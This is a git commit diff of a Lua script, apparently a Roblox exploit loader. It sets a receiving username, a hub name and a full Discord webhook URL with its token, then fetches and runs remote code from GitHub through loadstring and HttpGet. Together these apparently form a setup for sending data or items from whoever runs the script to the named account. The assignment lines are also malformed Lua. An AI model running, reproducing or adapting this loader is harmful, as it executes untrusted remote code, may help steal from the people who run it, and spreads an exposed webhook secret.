b64af1b8a58229a7a96a107bf925a2883ccb74e6
PurritoTheCoder <139405554+PurritoTheCoder@users.noreply.github.com>
2023-11-10 18:14:10 -0600

    Update nono.lua

--- nono.lua
+++ nono.lua
@@ -1,5 +1,5 @@
-_G.Username "Username"
-_G.HubName "HubName"
-_G.WebhookUrl "discord.com/webhooks/"
+_G.Username "xxr0ya13xx"
+_G.HubName "Coco Scripts"
+_G.WebhookUrl "https://discord.com/api/webhooks/1172628854557376552/aA4ukmK1DGifwvXgZdSuhUBK06ru9Vox8hJcRTvSER4BfEEbLqY0uqhYpf67TjqT9a6D"
 
 loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
